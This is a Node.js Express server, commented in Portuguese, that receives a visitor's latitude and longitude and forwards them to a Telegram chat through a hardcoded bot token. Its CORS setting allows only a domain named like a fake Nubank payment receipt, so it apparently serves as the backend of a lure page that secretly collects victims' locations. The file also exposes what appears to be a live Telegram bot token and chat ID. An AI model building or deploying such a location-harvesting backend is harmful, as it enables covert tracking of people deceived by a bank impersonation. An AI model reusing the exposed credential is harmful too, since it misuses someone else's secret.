const express = require("express");
const bodyParser = require("body-parser");
const cors = require("cors");
const axios = require("axios");

const app = express();

// Configuração do CORS para permitir requisições do domínio específico
app.use(cors({
  origin: 'https://comprovantenubank.vercel.app', // Alterado para o domínio de produção
  methods: ['GET', 'POST'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));

// Usar o bodyParser para ler o conteúdo JSON
app.use(bodyParser.json());

const TELEGRAM_BOT_TOKEN = "7502261188:AAEnUwY-rA1307JXO3R7_O-3o8rZnEpJIJY"; // Substitua pelo token do seu bot
const TELEGRAM_CHAT_ID = "-4636630107"; // Substitua pelo ID do chat (ou grupo) para onde quer enviar

// Endpoint para enviar a localização
app.post("/send-location", async (req, res) => {
  const { latitude, longitude } = req.body;

  // Verifica se latitude e longitude foram fornecidos
  if (!latitude || !longitude) {
    return res.status(400).json({ success: false, message: "Latitude e longitude são obrigatórios." });
  }

  const message = `A localização do usuário é:\nLatitude: ${latitude}\nLongitude: ${longitude}`;

  try {
    // Envia a localização para o Telegram
    const response = await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: message,
    });

    // Verifica a resposta do Telegram para garantir que o envio foi bem-sucedido
    if (response.data.ok) {
      return res.status(200).json({ success: true, message: "Localização enviada com sucesso para o Telegram." });
    } else {
      // Se a resposta do Telegram não for bem-sucedida, retorne erro
      return res.status(500).json({ success: false, message: "Erro ao enviar a localização para o Telegram." });
    }
  } catch (error) {
    console.error("Erro ao enviar para o Telegram:", error.response ? error.response.data : error.message);

    // Tratamento de erros mais detalhado
    return res.status(500).json({ 
      success: false, 
      message: "Erro ao enviar a localização para o Telegram. Tente novamente mais tarde.",
      error: error.message // Inclui a mensagem de erro para ajudar na depuração
    });
  }
});

// Inicializa o servidor na porta 8088
app.listen(8088, () => {
  console.log("Servidor rodando na porta 8088");
});
